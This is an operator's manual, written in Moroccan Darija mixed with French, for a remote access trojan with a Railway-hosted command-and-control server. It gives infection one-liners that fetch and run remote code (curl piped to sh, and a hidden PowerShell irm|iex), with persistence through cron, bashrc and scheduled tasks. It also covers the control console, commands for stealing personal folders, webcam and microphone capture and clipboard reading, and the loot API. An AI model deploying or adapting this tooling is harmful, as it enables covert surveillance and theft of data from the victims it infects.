# MANUAL — C2 dyal Railway

## 0. Chnou kayn

`app.py` = l'serveur. Kayexpose page web + API + bootstrap links.
`agent.py` = kayt9ra mn `/a`, kaybdel `__BASE__`/`__TOKEN__` w kaydwez l dda7ya.
`console.py` = l'console f Termux.

L'agent ma kaydirch connexion l dakhil. Kaydir **HTTPS poll** l `/p/<sid>` kol
~1s. Donc kaydwez f CGNAT, 4G, firewall dyal l'wifi d l'café.

## 1. Deploy (mrra wa7da)

    cd ~/rat
    npm i -g @railway/cli
    railway login
    railway init
    railway variables --set AUTH=6553a3b73624003ba0ed5aa5a83a4f8c
    railway variables --set AGENT_TOKEN=376c16a0ff5b4c220eb74361a3c8b0a3
    railway up
    railway domain

Khelli `AUTH` w `AGENT_TOKEN`. `railway domain` kay3tik l'URL.
Ila bghit domaine dyalek: Settings → Networking → Custom Domain,
w 7et `BASE_URL=https://domaine.dyalek` f Variables.

## 2. L'attaque

Linux / Termux / Android:

    curl -fsSL https://1uciferxyz.com/ | sh

Windows (hidden):

    powershell -w hidden -c "irm https://1uciferxyz.com/i.ps1 | iex"

L'installer kaydir: python install (ila khass), payload fetch, detach,
wake-lock, persistence (boot/cron/bashrc wla schtasks).

## 3. L'control mn Termux

A. Console (l'asas):

    termux-wake-lock
    python3 ~/rat/console.py --url https://1uciferxyz.com/ --key <AUTH>

B. Panel f l'browser:

    termux-open-url "https://1uciferxyz.com/?k=<AUTH>"

  Wla 7el Chrome w lsa9 l'URL b yeddek. Zid 3la home screen.

  F l'panel: 7et l'key f l'input → connect. Kayban lik l'sessions.
  Klik 3la session → katkteb f l'input → Enter.
  Ay 7aja bla `.` = shell. B `.` = commande d l'RAT.
  L'buttons (steal / shot / info) = shortcuts.

C. Khelli l'console 7ayya: `termux-wake-lock` + tmux wla session thenya.

## 4. L'commands

### 4.1 Global (console, bla attach)

| Commande | Chnou kaydir |
|---|---|
| `ls` / `list` | kaywerri sessions: ID, user@host, IP, OS |
| `in <id>` | kaydkhel l session |
| `loot` | kaywerri l'files li t7sado (fid, size, nom) |
| `dl <fid>` | kaytnzzel loot f `~/loot/<fid>.bin` |
| `q` | kaykhrej |

### 4.2 Shell

Ay kteba bla `.` = kaytnaffed f shell d dda7ya, output kayji live,
kaytsali b `[rc=N]`. CWD kaybqa m7fud mabin l'commands.

    id; uname -a
    whoami
    ipconfig /all
    dir C:\Users

### 4.3 Dot-commands (attach wla panel)

| Commande | Chnou kaydir | Notes |
|---|---|---|
| `.leave` | kayfkk l'attach | session kaybqa 7ayya |
| `.info` | host, user, OS, arch, IP, PID, python | JSON |
| `.ps` | liste d l'processus | `ps aux` / `tasklist` |
| `.pwd` | l'dossier l7ali | |
| `.cd <dir>` | kaybdel l'dossier | `~` kayt9ra home |
| `.ls <dir>` | liste d l'files (détails) | bla argument = `.` |
| `.get <path>` | kayjib file | kaybqa f loot |
| `.put <file>` | kaydwez file l dda7ya | kaytsjel f CWD dyalha |
| `.steal` | tar.gz d Desktop/Documents/Downloads/Pictures/DCIM/Movies/Music | l'akbar fayda |
| `.grab <dir>` | tar.gz d dossier kaml | ay dossier |
| `.shot` | screenshot d l'écran | |
| `.cam` | tsawra b webcam | |
| `.audio <sec>` | تسجيل micro | kaybghi `termux-api` |
| `.clip` | kay9ra clipboard | |
| `.clip <text>` | kaykteb f clipboard | |
| `.toast <text>` | notification Android | kaybghi `termux-api` |
| `.vibrate <ms>` | vibration | kaybghi `termux-api` |
| `.py <code>` | kaynaffed Python f dda7ya | 7et l'resultat f `r` |
| `.persist` | kay7et persistence | boot/cron/bashrc/schtasks |
| `.unpersist` | kayn7i persistence | |
| `.sd` | self-destruct: kayn7i rasso + persistence | session katsali |

### 4.4 Panel

Nafs `.commands` kaykhedmo f l'input. Zid:

- `steal` / `shot` / `info` buttons = shortcuts
- liste d loot f l'asfal → klik 3la smiya = téléchargement
- file picker = upload l dda7ya (`.put` equivalent)

## 5. HTTP API (scripting)

Kolchi kaybghi header `X-Auth: <AUTH>` wla `?k=<AUTH>`.

| Endpoint | Chnou kaydir |
|---|---|
| `GET /api/sessions` | JSON d sessions |
| `POST /api/cmd` `{sid,cmd}` | kaydir commande |
| `GET /api/out?sid&after` | output jdid |
| `GET /api/loot` | JSON d loot |
| `GET /api/loot/<fid>` | téléchargement |
| `POST /api/put` (X-Sid, X-Name, body) | upload |

Bla auth (l dda7ya): `GET /i`, `GET /i.ps1`, `GET /a`, `GET /p/<sid>`, `POST /r/<sid>`, `GET /py`, `GET /healthz`.

## 6. Chnou ma kaykhedmch

| 7aja | 3lach | L'7ell |
|---|---|---|
| `vim`, `top`, `nano` | ma kaynch PTY | `screen -dmS x vim f` wla `.py` |
| Screenshot f Android 10+ | permission dyal vendor | `.cam` wla `screencap` b root |
| `.audio` / `.toast` / `.vibrate` | `termux-api` makaynch | `pkg install termux-api` + app Termux:API |
| Upload > 8 MB | Railway timeout | `.grab` 3la chqaf, wla split |
| Loot kaytle9 mn be3d restart | state f mémoire | zid SQLite + volume |
| Session katgoul `-` (offline) | agent tqte3 > 90s | kayrje3 bouhdo; `sd` ila bghit t9tlo |
| `curl: command not found` | installer | `pkg install curl` |

## 7. Sécurité

- `?k=` kaybqa f l'history d l'browser — 3awd beddel `AUTH` mn be3d kol session.
- `AGENT_TOKEN` kaybqa f `/a` — chi 7ed y9der ydir replay l `/p`/`/r`, walakin ma y9der ydir walou bla `AUTH`.
- Channel = HTTPS (cert valide dyal Railway). Ma kaynch pinning — proxy MITM kay9der ychouf.
- `.sd` ma kayn7ich l'files li stealti — ghir rasso w persistence.
